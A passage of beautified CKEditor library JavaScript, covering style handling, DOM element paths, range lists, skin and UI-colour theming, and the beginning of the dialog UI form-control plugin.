            n = this.element = e.element ? "string" == typeof e.element ? e.element.toLowerCase() : e.element : "*",
            this.type = e.type || (E[n] ? CKEDITOR.STYLE_BLOCK : p[n] ? CKEDITOR.STYLE_OBJECT : CKEDITOR.STYLE_INLINE),
            "object" == typeof this.element && (this.type = CKEDITOR.STYLE_OBJECT), this._ = {
                definition: e
            };
        }, CKEDITOR.style.prototype = {
            apply: function(e) {
                if (e instanceof CKEDITOR.dom.document) return g.call(this, e.getSelection());
                if (this.checkApplicable(e.elementPath(), e)) {
                    var t = this._.enterMode;
                    t || (this._.enterMode = e.activeEnterMode), g.call(this, e.getSelection(), 0, e),
                    this._.enterMode = t;
                }
            },
            remove: function(e) {
                if (e instanceof CKEDITOR.dom.document) return g.call(this, e.getSelection(), 1);
                if (this.checkApplicable(e.elementPath(), e)) {
                    var t = this._.enterMode;
                    t || (this._.enterMode = e.activeEnterMode), g.call(this, e.getSelection(), 1, e),
                    this._.enterMode = t;
                }
            },
            applyToRange: function(e) {
                return this.applyToRange = this.type == CKEDITOR.STYLE_INLINE ? y : this.type == CKEDITOR.STYLE_BLOCK ? o : this.type == CKEDITOR.STYLE_OBJECT ? n : null,
                this.applyToRange(e);
            },
            removeFromRange: function(e) {
                return this.removeFromRange = this.type == CKEDITOR.STYLE_INLINE ? t : this.type == CKEDITOR.STYLE_BLOCK ? a : this.type == CKEDITOR.STYLE_OBJECT ? i : null,
                this.removeFromRange(e);
            },
            applyToObject: function(e) {
                s(e, this);
            },
            checkActive: function(e, t) {
                switch (this.type) {
                  case CKEDITOR.STYLE_BLOCK:
                    return this.checkElementRemovable(e.block || e.blockLimit, !0, t);

                  case CKEDITOR.STYLE_OBJECT:
                  case CKEDITOR.STYLE_INLINE:
                    for (var n, i = e.elements, o = 0; o < i.length; o++) if (n = i[o], this.type != CKEDITOR.STYLE_INLINE || n != e.block && n != e.blockLimit) {
                        if (this.type == CKEDITOR.STYLE_OBJECT) {
                            var a = n.getName();
                            if (!("string" == typeof this.element ? a == this.element : a in this.element)) continue;
                        }
                        if (this.checkElementRemovable(n, !0, t)) return !0;
                    }
                }
                return !1;
            },
            checkApplicable: function(e, t, n) {
                if (t && t instanceof CKEDITOR.filter && (n = t), n && !n.check(this)) return !1;
                switch (this.type) {
                  case CKEDITOR.STYLE_OBJECT:
                    return !!e.contains(this.element);

                  case CKEDITOR.STYLE_BLOCK:
                    return !!e.blockLimit.getDtd()[this.element];
                }
                return !0;
            },
            checkElementMatch: function(e, t) {
                var n = this._.definition;
                if (!e || !n.ignoreReadonly && e.isReadOnly()) return !1;
                if (i = e.getName(), "string" == typeof this.element ? i == this.element : i in this.element) {
                    if (!t && !e.hasAttributes()) return !0;
                    if (i = n._AC) n = i; else {
                        var i = {}, o = 0, a = n.attributes;
                        if (a) for (var r in a) o++, i[r] = a[r];
                        (r = CKEDITOR.style.getStyleText(n)) && (i.style || o++, i.style = r), i._length = o,
                        n = n._AC = i;
                    }
                    if (!n._length) return !0;
                    for (var s in n) if ("_length" != s) {
                        if (o = e.getAttribute(s) || "", "style" == s) e: {
                            for (r in "string" == typeof (i = n[s]) && (i = CKEDITOR.tools.parseCssText(i)),
                            "string" == typeof o && (o = CKEDITOR.tools.parseCssText(o, !0)), r = void 0, i) if (!(r in o) || o[r] != i[r] && "inherit" != i[r] && "inherit" != o[r]) {
                                i = !1;
                                break e;
                            }
                            i = !0;
                        } else i = n[s] == o;
                        if (i) {
                            if (!t) return !0;
                        } else if (t) return !1;
                    }
                    if (t) return !0;
                }
                return !1;
            },
            checkElementRemovable: function(e, t, n) {
                if (this.checkElementMatch(e, t, n)) return !0;
                if (t = f(this)[e.getName()]) {
                    var i;
                    if (!(t = t.attributes)) return !0;
                    for (n = 0; n < t.length; n++) if (i = t[n][0], i = e.getAttribute(i)) {
                        var o = t[n][1];
                        if (null === o) return !0;
                        if ("string" == typeof o) {
                            if (i == o) return !0;
                        } else if (o.test(i)) return !0;
                    }
                }
                return !1;
            },
            buildPreview: function(e) {
                var t = this._.definition, n = [], i = t.element;
                "bdo" == i && (i = "span"), n = [ "<", i ];
                var o = t.attributes;
                if (o) for (var a in o) n.push(" ", a, '="', o[a], '"');
                return (o = CKEDITOR.style.getStyleText(t)) && n.push(' style="', o, '"'), n.push(">", e || t.name, "</", i, ">"),
                n.join("");
            },
            getDefinition: function() {
                return this._.definition;
            }
        }, CKEDITOR.style.getStyleText = function(e) {
            if (t = e._ST) return t;
            var t = e.styles, n = e.attributes && e.attributes.style || "", i = "";
            for (var o in n.length && (n = n.replace(T, ";")), t) {
                var a = t[o], r = (o + ":" + a).replace(T, ";");
                "inherit" == a ? i += r : n += r;
            }
            return n.length && (n = CKEDITOR.tools.normalizeCssText(n, !0)), e._ST = n + i;
        }, CKEDITOR.style.customHandlers = {}, CKEDITOR.style.addCustomHandler = function(e) {
            var t = function(e) {
                this._ = {
                    definition: e
                }, this.setup && this.setup(e);
            };
            return t.prototype = CKEDITOR.tools.extend(CKEDITOR.tools.prototypedCopy(CKEDITOR.style.prototype), {
                assignedTo: CKEDITOR.STYLE_OBJECT
            }, e, !0), this.customHandlers[e.type] = t;
        };
        var w = CKEDITOR.POSITION_PRECEDING | CKEDITOR.POSITION_IDENTICAL | CKEDITOR.POSITION_IS_CONTAINED, x = CKEDITOR.POSITION_FOLLOWING | CKEDITOR.POSITION_IDENTICAL | CKEDITOR.POSITION_IS_CONTAINED;
    }(), CKEDITOR.styleCommand = function(e, t) {
        this.requiredContent = this.allowedContent = this.style = e, CKEDITOR.tools.extend(this, t, !0);
    }, CKEDITOR.styleCommand.prototype.exec = function(e) {
        e.focus(), this.state == CKEDITOR.TRISTATE_OFF ? e.applyStyle(this.style) : this.state == CKEDITOR.TRISTATE_ON && e.removeStyle(this.style);
    }, CKEDITOR.stylesSet = new CKEDITOR.resourceManager("", "stylesSet"), CKEDITOR.addStylesSet = CKEDITOR.tools.bind(CKEDITOR.stylesSet.add, CKEDITOR.stylesSet),
    CKEDITOR.loadStylesSet = function(e, t, n) {
        CKEDITOR.stylesSet.addExternal(e, t, ""), CKEDITOR.stylesSet.load(e, n);
    }, CKEDITOR.tools.extend(CKEDITOR.editor.prototype, {
        attachStyleStateChange: function(e, t) {
            var o = this._.styleStateChangeCallbacks;
            o || (o = this._.styleStateChangeCallbacks = [], this.on("selectionChange", function(e) {
                for (var t = 0; t < o.length; t++) {
                    var n = o[t], i = n.style.checkActive(e.data.path, this) ? CKEDITOR.TRISTATE_ON : CKEDITOR.TRISTATE_OFF;
                    n.fn.call(this, i);
                }
            })), o.push({
                style: e,
                fn: t
            });
        },
        applyStyle: function(e) {
            e.apply(this);
        },
        removeStyle: function(e) {
            e.remove(this);
        },
        getStylesSet: function(t) {
            if (this._.stylesDefinitions) t(this._.stylesDefinitions); else {
                var n = this, e = n.config.stylesCombo_stylesSet || n.config.stylesSet;
                if (!1 === e) t(null); else if (e instanceof Array) n._.stylesDefinitions = e, t(e); else {
                    e || (e = "default");
                    var i = (e = e.split(":"))[0];
                    CKEDITOR.stylesSet.addExternal(i, e[1] ? e.slice(1).join(":") : CKEDITOR.getUrl("styles.js"), ""),
                    CKEDITOR.stylesSet.load(i, function(e) {
                        n._.stylesDefinitions = e[i], t(n._.stylesDefinitions);
                    });
                }
            }
        }
    }), CKEDITOR.dom.comment = function(e, t) {
        "string" == typeof e && (e = (t ? t.$ : document).createComment(e)), CKEDITOR.dom.domObject.call(this, e);
    }, CKEDITOR.dom.comment.prototype = new CKEDITOR.dom.node(), CKEDITOR.tools.extend(CKEDITOR.dom.comment.prototype, {
        type: CKEDITOR.NODE_COMMENT,
        getOuterHtml: function() {
            return "\x3c!--" + this.$.nodeValue + "--\x3e";
        }
    }), function() {
        var e, d = {}, u = {};
        for (e in CKEDITOR.dtd.$blockLimit) e in CKEDITOR.dtd.$list || (d[e] = 1);
        for (e in CKEDITOR.dtd.$block) e in CKEDITOR.dtd.$blockLimit || e in CKEDITOR.dtd.$empty || (u[e] = 1);
        CKEDITOR.dom.elementPath = function(e, t) {
            var n, i = null, o = null, a = [], r = e;
            t = t || e.getDocument().getBody();
            do {
                if (r.type == CKEDITOR.NODE_ELEMENT) {
                    if (a.push(r), !this.lastElement && ((this.lastElement = r).is(CKEDITOR.dtd.$object) || "false" == r.getAttribute("contenteditable"))) continue;
                    if (r.equals(t)) break;
                    if (!o && (n = r.getName(), "true" == r.getAttribute("contenteditable") ? o = r : !i && u[n] && (i = r),
                    d[n])) {
                        var s;
                        if (s = !i) {
                            if (n = "div" == n) {
                                e: {
                                    s = 0;
                                    for (var l = (n = r.getChildren()).count(); s < l; s++) {
                                        var c = n.getItem(s);
                                        if (c.type == CKEDITOR.NODE_ELEMENT && CKEDITOR.dtd.$block[c.getName()]) {
                                            n = !0;
                                            break e;
                                        }
                                    }
                                    n = !1;
                                }
                                n = !n;
                            }
                            s = n;
                        }
                        s ? i = r : o = r;
                    }
                }
            } while (r = r.getParent());
            o || (o = t), this.block = i, this.blockLimit = o, this.root = t, this.elements = a;
        };
    }(), CKEDITOR.dom.elementPath.prototype = {
        compare: function(e) {
            var t = this.elements;
            if (!(e = e && e.elements) || t.length != e.length) return !1;
            for (var n = 0; n < t.length; n++) if (!t[n].equals(e[n])) return !1;
            return !0;
        },
        contains: function(t, e, n) {
            var i;
            "string" == typeof t && (i = function(e) {
                return e.getName() == t;
            }), t instanceof CKEDITOR.dom.element ? i = function(e) {
                return e.equals(t);
            } : CKEDITOR.tools.isArray(t) ? i = function(e) {
                return -1 < CKEDITOR.tools.indexOf(t, e.getName());
            } : "function" == typeof t ? i = t : "object" == typeof t && (i = function(e) {
                return e.getName() in t;
            });
            var o = this.elements, a = o.length;
            for (e && a--, n && (o = Array.prototype.slice.call(o, 0)).reverse(), e = 0; e < a; e++) if (i(o[e])) return o[e];
            return null;
        },
        isContextFor: function(e) {
            return !(e in CKEDITOR.dtd.$block && !(this.contains(CKEDITOR.dtd.$intermediate) || this.root.equals(this.block) && this.block || this.blockLimit).getDtd()[e]);
        },
        direction: function() {
            return (this.block || this.blockLimit || this.root).getDirection(1);
        }
    }, CKEDITOR.dom.text = function(e, t) {
        "string" == typeof e && (e = (t ? t.$ : document).createTextNode(e)), this.$ = e;
    }, CKEDITOR.dom.text.prototype = new CKEDITOR.dom.node(), CKEDITOR.tools.extend(CKEDITOR.dom.text.prototype, {
        type: CKEDITOR.NODE_TEXT,
        getLength: function() {
            return this.$.nodeValue.length;
        },
        getText: function() {
            return this.$.nodeValue;
        },
        setText: function(e) {
            this.$.nodeValue = e;
        },
        split: function(e) {
            var t = this.$.parentNode, n = t.childNodes.length, i = this.getLength(), o = this.getDocument(), a = new CKEDITOR.dom.text(this.$.splitText(e), o);
            return t.childNodes.length == n && (i <= e ? (a = o.createText("")).insertAfter(this) : ((e = o.createText("")).insertAfter(a),
            e.remove())), a;
        },
        substring: function(e, t) {
            return "number" != typeof t ? this.$.nodeValue.substr(e) : this.$.nodeValue.substring(e, t);
        }
    }), function() {
        function a(e, t, n) {
            var i = e.serializable, o = t[n ? "endContainer" : "startContainer"], a = n ? "endOffset" : "startOffset", r = i ? t.document.getById(e.startNode) : e.startNode;
            return e = i ? t.document.getById(e.endNode) : e.endNode, o.equals(r.getPrevious()) ? (t.startOffset = t.startOffset - o.getLength() - e.getPrevious().getLength(),
            o = e.getNext()) : o.equals(e.getPrevious()) && (t.startOffset = t.startOffset - o.getLength(),
            o = e.getNext()), o.equals(r.getParent()) && t[a]++, o.equals(e.getParent()) && t[a]++,
            t[n ? "endContainer" : "startContainer"] = o, t;
        }
        CKEDITOR.dom.rangeList = function(e) {
            return e instanceof CKEDITOR.dom.rangeList ? e : (e ? e instanceof CKEDITOR.dom.range && (e = [ e ]) : e = [],
            CKEDITOR.tools.extend(e, t));
        };
        var t = {
            createIterator: function() {
                var a, r = this, s = CKEDITOR.dom.walker.bookmark(), l = [];
                return {
                    getNextRange: function(e) {
                        var t = r[a = void 0 === a ? 0 : a + 1];
                        if (t && 1 < r.length) {
                            if (!a) for (i = r.length - 1; 0 <= i; i--) l.unshift(r[i].createBookmark(!0));
                            if (e) for (var n = 0; r[a + n + 1]; ) {
                                e = 0;
                                for (var i = (o = t.document).getById(l[n].endNode), o = o.getById(l[n + 1].startNode); ;) {
                                    if (i = i.getNextSourceNode(!1), o.equals(i)) e = 1; else if (s(i) || i.type == CKEDITOR.NODE_ELEMENT && i.isBlockBoundary()) continue;
                                    break;
                                }
                                if (!e) break;
                                n++;
                            }
                            for (t.moveToBookmark(l.shift()); n--; ) (i = r[++a]).moveToBookmark(l.shift()),
                            t.setEnd(i.endContainer, i.endOffset);
                        }
                        return t;
                    }
                };
            },
            createBookmarks: function(e) {
                for (var t, n = [], i = 0; i < this.length; i++) {
                    n.push(t = this[i].createBookmark(e, !0));
                    for (var o = i + 1; o < this.length; o++) this[o] = a(t, this[o]), this[o] = a(t, this[o], !0);
                }
                return n;
            },
            createBookmarks2: function(e) {
                for (var t = [], n = 0; n < this.length; n++) t.push(this[n].createBookmark2(e));
                return t;
            },
            moveToBookmarks: function(e) {
                for (var t = 0; t < this.length; t++) this[t].moveToBookmark(e[t]);
            }
        };
    }(), function() {
        function a() {
            return CKEDITOR.getUrl(CKEDITOR.skinName.split(",")[1] || "skins/" + CKEDITOR.skinName.split(",")[0] + "/");
        }
        function n(e) {
            var t = CKEDITOR.skin["ua_" + e], n = CKEDITOR.env;
            if (t) {
                t = t.split(",").sort(function(e, t) {
                    return t < e ? -1 : 1;
                });
                for (var i, o = 0; o < t.length; o++) if (i = t[o], n.ie && (i.replace(/^ie/, "") == n.version || n.quirks && "iequirks" == i) && (i = "ie"),
                n[i]) {
                    e = e + "_" + t[o];
                    break;
                }
            }
            return CKEDITOR.getUrl(a() + e + ".css");
        }
        function i(e, t) {
            o[e] || (CKEDITOR.document.appendStyleSheet(n(e)), o[e] = 1), t && t();
        }
        function r(e) {
            var t = e.getById(l);
            return t || ((t = e.getHead().append("style")).setAttribute("id", l), t.setAttribute("type", "text/css")),
            t;
        }
        function s(e, t, n) {
            var i, o, a;
            if (CKEDITOR.env.webkit) for (t = t.split("}").slice(0, -1), o = 0; o < t.length; o++) t[o] = t[o].split("{");
            for (var r = 0; r < e.length; r++) if (CKEDITOR.env.webkit) for (o = 0; o < t.length; o++) {
                for (a = t[o][1], i = 0; i < n.length; i++) a = a.replace(n[i][0], n[i][1]);
                e[r].$.sheet.addRule(t[o][0], a);
            } else {
                for (a = t, i = 0; i < n.length; i++) a = a.replace(n[i][0], n[i][1]);
                CKEDITOR.env.ie && CKEDITOR.env.version < 11 ? e[r].$.styleSheet.cssText = e[r].$.styleSheet.cssText + a : e[r].$.innerHTML = e[r].$.innerHTML + a;
            }
        }
        var o = {};
        CKEDITOR.skin = {
            path: a,
            loadPart: function(e, t) {
                CKEDITOR.skin.name != CKEDITOR.skinName.split(",")[0] ? CKEDITOR.scriptLoader.load(CKEDITOR.getUrl(a() + "skin.js"), function() {
                    i(e, t);
                }) : i(e, t);
            },
            getPath: function(e) {
                return CKEDITOR.getUrl(n(e));
            },
            icons: {},
            addIcon: function(e, t, n, i) {
                e = e.toLowerCase(), this.icons[e] || (this.icons[e] = {
                    path: t,
                    offset: n || 0,
                    bgsize: i || "16px"
                });
            },
            getIconStyle: function(e, t, n, i, o) {
                var a;
                return e && (e = e.toLowerCase(), t && (a = this.icons[e + "-rtl"]), a || (a = this.icons[e])),
                e = n || a && a.path || "", i = i || a && a.offset, o = o || a && a.bgsize || "16px",
                e && "background-image:url(" + CKEDITOR.getUrl(e) + ");background-position:0 " + i + "px;background-size:" + o + ";";
            }
        }, CKEDITOR.tools.extend(CKEDITOR.editor.prototype, {
            getUiColor: function() {
                return this.uiColor;
            },
            setUiColor: function(e) {
                var o = r(CKEDITOR.document);
                return (this.setUiColor = function(e) {
                    this.uiColor = e;
                    var t = CKEDITOR.skin.chameleon, n = "", i = "";
                    "function" == typeof t && (n = t(this, "editor"), i = t(this, "panel")), s([ o ], n, e = [ [ d, e ] ]),
                    s(c, i, e);
                }).call(this, e);
            }
        });
        var l = "cke_ui_color", c = [], d = /\$color/g;
        CKEDITOR.on("instanceLoaded", function(e) {
            if (!CKEDITOR.env.ie || !CKEDITOR.env.quirks) {
                var n = e.editor;
                e = function(e) {
                    if (!(e = (e.data[0] || e.data).element.getElementsByTag("iframe").getItem(0).getFrameDocument()).getById("cke_ui_color")) {
                        e = r(e), c.push(e);
                        var t = n.getUiColor();
                        t && s([ e ], CKEDITOR.skin.chameleon(n, "panel"), [ [ d, t ] ]);
                    }
                }, n.on("panelShow", e), n.on("menuShow", e), n.config.uiColor && n.setUiColor(n.config.uiColor);
            }
        });
    }(), function() {
        if (CKEDITOR.env.webkit) CKEDITOR.env.hc = !1; else {
            var e = CKEDITOR.dom.element.createFromHtml('<div style="width:0;height:0;position:absolute;left:-10000px;border:1px solid;border-color:red blue"></div>', CKEDITOR.document);
            e.appendTo(CKEDITOR.document.getHead());
            try {
                var t = e.getComputedStyle("border-top-color"), n = e.getComputedStyle("border-right-color");
                CKEDITOR.env.hc = !(!t || t != n);
            } catch (e) {
                CKEDITOR.env.hc = !1;
            }
            e.remove();
        }
        if (CKEDITOR.env.hc && (CKEDITOR.env.cssClass = CKEDITOR.env.cssClass + " cke_hc"),
        CKEDITOR.document.appendStyleText(".cke{visibility:hidden;}"), CKEDITOR.status = "loaded",
        CKEDITOR.fireOnce("loaded"), e = CKEDITOR._.pending) for (delete CKEDITOR._.pending,
        t = 0; t < e.length; t++) CKEDITOR.editor.prototype.constructor.apply(e[t][0], e[t][1]),
        CKEDITOR.add(e[t][0]);
    }(), CKEDITOR.skin.name = "moono", CKEDITOR.skin.ua_editor = "ie,iequirks,ie7,ie8,gecko",
    CKEDITOR.skin.ua_dialog = "ie,iequirks,ie7,ie8", CKEDITOR.skin.chameleon = (u = function(e, t) {
        for (var n = e.match(/[^#]./g), i = 0; i < 3; i++) {
            var o, a = n, r = i;
            o = parseInt(n[i], 16), o = ("0" + (t < 0 ? 0 | o * (1 + t) : 0 | o + (255 - o) * t).toString(16)).slice(-2),
            a[r] = o;
        }
        return "#" + n.join("");
    }, d = new CKEDITOR.template("background:#{to};background-image:-webkit-gradient(linear,lefttop,leftbottom,from({from}),to({to}));background-image:-moz-linear-gradient(top,{from},{to});background-image:-webkit-linear-gradient(top,{from},{to});background-image:-o-linear-gradient(top,{from},{to});background-image:-ms-linear-gradient(top,{from},{to});background-image:linear-gradient(top,{from},{to});filter:progid:DXImageTransform.Microsoft.gradient(gradientType=0,startColorstr='{from}',endColorstr='{to}');"),
    h = function(e, t) {
        return d.output({
            from: e,
            to: t
        });
    }, f = {
        editor: new CKEDITOR.template("{id}.cke_chrome [border-color:{defaultBorder};] {id} .cke_top [ {defaultGradient}border-bottom-color:{defaultBorder};] {id} .cke_bottom [{defaultGradient}border-top-color:{defaultBorder};] {id} .cke_resizer [border-right-color:{ckeResizer}] {id} .cke_dialog_title [{defaultGradient}border-bottom-color:{defaultBorder};] {id} .cke_dialog_footer [{defaultGradient}outline-color:{defaultBorder};border-top-color:{defaultBorder};] {id} .cke_dialog_tab [{lightGradient}border-color:{defaultBorder};] {id} .cke_dialog_tab:hover [{mediumGradient}] {id} .cke_dialog_contents [border-top-color:{defaultBorder};] {id} .cke_dialog_tab_selected, {id} .cke_dialog_tab_selected:hover [background:{dialogTabSelected};border-bottom-color:{dialogTabSelectedBorder};] {id} .cke_dialog_body [background:{dialogBody};border-color:{defaultBorder};] {id} .cke_toolgroup [{lightGradient}border-color:{defaultBorder};] {id} a.cke_button_off:hover, {id} a.cke_button_off:focus, {id} a.cke_button_off:active [{mediumGradient}] {id} .cke_button_on [{ckeButtonOn}] {id} .cke_toolbar_separator [background-color: {ckeToolbarSeparator};] {id} .cke_combo_button [border-color:{defaultBorder};{lightGradient}] {id} a.cke_combo_button:hover, {id} a.cke_combo_button:focus, {id} .cke_combo_on a.cke_combo_button [border-color:{defaultBorder};{mediumGradient}] {id} .cke_path_item [color:{elementsPathColor};] {id} a.cke_path_item:hover, {id} a.cke_path_item:focus, {id} a.cke_path_item:active [background-color:{elementsPathBg};] {id}.cke_panel [border-color:{defaultBorder};] "),
        panel: new CKEDITOR.template(".cke_panel_grouptitle [{lightGradient}border-color:{defaultBorder};] .cke_menubutton_icon [background-color:{menubuttonIcon};] .cke_menubutton:hover .cke_menubutton_icon, .cke_menubutton:focus .cke_menubutton_icon, .cke_menubutton:active .cke_menubutton_icon [background-color:{menubuttonIconHover};] .cke_menuseparator [background-color:{menubuttonIcon};] a:hover.cke_colorbox, a:focus.cke_colorbox, a:active.cke_colorbox [border-color:{defaultBorder};] a:hover.cke_colorauto, a:hover.cke_colormore, a:focus.cke_colorauto, a:focus.cke_colormore, a:active.cke_colorauto, a:active.cke_colormore [background-color:{ckeColorauto};border-color:{defaultBorder};] ")
    }, function(e, t) {
        var n = e.uiColor;
        return n = {
            id: "." + e.id,
            defaultBorder: u(n, -.1),
            defaultGradient: h(u(n, .9), n),
            lightGradient: h(u(n, 1), u(n, .7)),
            mediumGradient: h(u(n, .8), u(n, .5)),
            ckeButtonOn: h(u(n, .6), u(n, .7)),
            ckeResizer: u(n, -.4),
            ckeToolbarSeparator: u(n, .5),
            ckeColorauto: u(n, .8),
            dialogBody: u(n, .7),
            dialogTabSelected: h("#FFFFFF", "#FFFFFF"),
            dialogTabSelectedBorder: "#FFF",
            elementsPathColor: u(n, -.6),
            elementsPathBg: n,
            menubuttonIcon: u(n, .5),
            menubuttonIconHover: u(n, .3)
        }, f[t].output(n).replace(/\[/g, "{").replace(/\]/g, "}");
    }), CKEDITOR.plugins.add("dialogui", {
        onLoad: function() {
            var s, c = function(e) {
                this._ || (this._ = {}), this._.default = this._.initValue = e.default || "", this._.required = e.required || !1;
                for (var t = [ this._ ], n = 1; n < arguments.length; n++) t.push(arguments[n]);
                return t.push(!0), CKEDITOR.tools.extend.apply(CKEDITOR.tools, t), this._;
            }, e = {
                build: function(e, t, n) {
                    return new CKEDITOR.ui.dialog.textInput(e, t, n);
                }
            }, t = {
                build: function(e, t, n) {
                    return new CKEDITOR.ui.dialog[t.type](e, t, n);
                }
            }, n = {
                isChanged: function() {
                    return this.getValue() != this.getInitValue();
                },
                reset: function(e) {
                    this.setValue(this.getInitValue(), e);
                },
                setInitValue: function() {
                    this._.initValue = this.getValue();
                },
                resetInitValue: function() {
                    this._.initValue = this._.default;
                },
                getInitValue: function() {
                    return this._.initValue;
                }
            }, i = CKEDITOR.tools.extend({}, CKEDITOR.ui.dialog.uiElement.prototype.eventProcessors, {
                onChange: function(e, t) {
                    this._.domOnChangeRegistered || (e.on("load", function() {
                        this.getInputElement().on("change", function() {
                            e.parts.dialog.isVisible() && this.fire("change", {
                                value: this.getValue()
                            });
                        }, this);
                    }, this), this._.domOnChangeRegistered = !0), this.on("change", t);
                }
            }, !0), o = /^on([A-Z]\w+)/, g = function(e) {
                for (var t in e) (o.test(t) || "title" == t || "type" == t) && delete e[t];
                return e;
            };
            CKEDITOR.tools.extend(CKEDITOR.ui.dialog, {
                labeledElement: function(n, i, e, o) {
                    if (!(arguments.length < 4)) {
                        var a = c.call(this, i);
                        a.labelId = CKEDITOR.tools.getNextId() + "_label", this._.children = [];
                        var t = {
                            role: i.role || "presentation"
                        };
                        i.includeLabel && (t["aria-labelledby"] = a.labelId), CKEDITOR.ui.dialog.uiElement.call(this, n, i, e, "div", null, t, function() {
                            var e = [], t = i.required ? " cke_required" : "";
                            return "horizontal" != i.labelLayout ? e.push('<label class="cke_dialog_ui_labeled_label' + t + '" ', ' id="' + a.labelId + '"', a.inputId ? ' for="' + a.inputId + '"' : "", (i.labelStyle ? ' style="' + i.labelStyle + '"' : "") + ">", i.label, "</label>", '<div class="cke_dialog_ui_labeled_content"', i.controlStyle ? ' style="' + i.controlStyle + '"' : "", ' role="presentation">', o.call(this, n, i), "</div>") : (t = {
                                type: "hbox",
                                widths: i.widths,
                                padding: 0,
                                children: [ {
                                    type: "html",
                                    html: '<label class="cke_dialog_ui_labeled_label' + t + '" id="' + a.labelId + '" for="' + a.inputId + '"' + (i.labelStyle ? ' style="' + i.labelStyle + '"' : "") + ">" + CKEDITOR.tools.htmlEncode(i.label) + "</span>"
                                }, {
                                    type: "html",
                                    html: '<span class="cke_dialog_ui_labeled_content"' + (i.controlStyle ? ' style="' + i.controlStyle + '"' : "") + ">" + o.call(this, n, i) + "</span>"
                                } ]
                            }, CKEDITOR.dialog._.uiElementBuilders.hbox.build(n, t, e)), e.join("");
                        });
                    }
                },
                textInput: function(t, n, e) {
                    if (!(arguments.length < 3)) {
                        c.call(this, n);
                        var i = this._.inputId = CKEDITOR.tools.getNextId() + "_textInput", o = {
                            class: "cke_dialog_ui_input_" + n.type,
                            id: i,
                            type: n.type
                        };
                        "txtAlt" == n.id && (-1 < CKEDITOR.editorName.search("translate") ? o["ht-txtalt"] = CKEDITOR.editorName.substring(0, 13) : o["ht-txtalt"] = ""),
                        n.validate && (this.validate = n.validate), n.maxLength && (o.maxlength = n.maxLength),
                        n.size && (o.size = n.size), n.inputStyle && (o.style = n.inputStyle);
                        var a = this, r = !1;
                        t.on("load", function() {
                            a.getInputElement().on("keydown", function(e) {
                                13 == e.data.getKeystroke() && (r = !0);
                            }), a.getInputElement().on("keyup", function(e) {
                                13 == e.data.getKeystroke() && r && (t.getButton("ok") && setTimeout(function() {
                                    t.getButton("ok").click();
                                }, 0), r = !1);
                            }, null, null, 1e3);
                        }), CKEDITOR.ui.dialog.labeledElement.call(this, t, n, e, function() {
                            var e = [ '<div class="cke_dialog_ui_input_', n.type, '" role="presentation"' ];
                            for (var t in n.width && e.push('style="width:' + n.width + '" '), e.push("><input "),
                            o["aria-labelledby"] = this._.labelId, this._.required && (o["aria-required"] = this._.required),
                            o) e.push(t + '="' + o[t] + '" ');
                            return e.push(" /></div>"), e.join("");
                        });
                    }
                },
                textarea: function(e, t, n) {
                    if (!(arguments.length < 3)) {
                        c.call(this, t);
                        var i = this, o = this._.inputId = CKEDITOR.tools.getNextId() + "_textarea", a = {};
                        t.validate && (this.validate = t.validate), a.rows = t.rows || 5, a.cols = t.cols || 20,
                        a.class = "cke_dialog_ui_input_textarea " + (t.class || ""), void 0 !== t.inputStyle && (a.style = t.inputStyle),
                        t.dir && (a.dir = t.dir), CKEDITOR.ui.dialog.labeledElement.call(this, e, t, n, function() {
                            a["aria-labelledby"] = this._.labelId, this._.required && (a["aria-required"] = this._.required);
                            var e, t = [ '<div class="cke_dialog_ui_input_textarea" role="presentation"><textarea id="', o, '" ' ];
                            for (e in a) t.push(e + '="' + CKEDITOR.tools.htmlEncode(a[e]) + '" ');
                            return t.push(">", CKEDITOR.tools.htmlEncode(i._.default), "</textarea></div>"),
                            t.join("");
                        });
                    }
                },
                checkbox: function(o, a, e) {
                    if (!(arguments.length < 3)) {
                        var r = c.call(this, a, {
                            default: !!a.default
                        });
                        a.validate && (this.validate = a.validate), CKEDITOR.ui.dialog.uiElement.call(this, o, a, e, "span", null, null, function() {
                            var e = CKEDITOR.tools.extend({}, a, {
                                id: a.id ? a.id + "_checkbox" : CKEDITOR.tools.getNextId() + "_checkbox"
                            }, !0), t = [], n = CKEDITOR.tools.getNextId() + "_label", i = {
                                class: "cke_dialog_ui_checkbox_input",
                                type: "checkbox",
                                "aria-labelledby": n
                            };
                            return g(e), a.default && (i.checked = "checked"), void 0 !== e.inputStyle && (e.style = e.inputStyle),
                            r.checkbox = new CKEDITOR.ui.dialog.uiElement(o, e, t, "input", null, i), t.push(' <label id="', n, '" for="', i.id, '"' + (a.labelStyle ? ' style="' + a.labelStyle + '"' : "") + ">", CKEDITOR.tools.htmlEncode(a.label), "</label>"),
                            t.join("");
                        });
                    }
                },
                radio: function(u, h, e) {
                    if (!(arguments.length < 3)) {
                        c.call(this, h), this._.default || (this._.default = this._.initValue = h.items[0][1]),
                        h.validate && (this.validate = h.valdiate);
                        var f = [], m = this;
                        h.role = "radiogroup", h.includeLabel = !0, CKEDITOR.ui.dialog.labeledElement.call(this, u, h, e, function() {
                            for (var e = [], t = [], n = (h.id ? h.id : CKEDITOR.tools.getNextId()) + "_radio", i = 0; i < h.items.length; i++) {
                                var o = h.items[i], a = void 0 !== o[2] ? o[2] : o[0], r = void 0 !== o[1] ? o[1] : o[0], s = (l = CKEDITOR.tools.getNextId() + "_radio_input") + "_label", l = CKEDITOR.tools.extend({}, h, {
                                    id: l,
                                    title: null,
                                    type: null
                                }, !0), c = (a = CKEDITOR.tools.extend({}, l, {
                                    title: a
                                }, !0), {
                                    type: "radio",
                                    class: "cke_dialog_ui_radio_input",
                                    name: n,
                                    value: r,
                                    "aria-labelledby": s
                                }), d = [];
                                m._.default == r && (c.checked = "checked"), g(l), g(a), void 0 !== l.inputStyle && (l.style = l.inputStyle),
                                l.keyboardFocusable = !0, f.push(new CKEDITOR.ui.dialog.uiElement(u, l, d, "input", null, c)),
                                d.push(" "), new CKEDITOR.ui.dialog.uiElement(u, a, d, "label", null, {
                                    id: s,
                                    for: c.id
                                }, o[0]), e.push(d.join(""));
                            }
                            return new CKEDITOR.ui.dialog.hbox(u, f, e, t), t.join("");
                        }), this._.children = f;
                    }
                },
                button: function(e, t, n) {
                    if (arguments.length) {
                        "function" == typeof t && (t = t(e.getParentEditor())), c.call(this, t, {
                            disabled: t.disabled || !1
                        }), CKEDITOR.event.implementOn(this);
                        var i = this;
                        e.on("load", function() {
                            var e = this.getElement();
                            e.on("click", function(e) {
                                i.click(), e.data.preventDefault();
                            }), e.on("keydown", function(e) {
                                e.data.getKeystroke() in {
                                    32: 1
                                } && (i.click(), e.data.preventDefault());
                            }), e.unselectable();
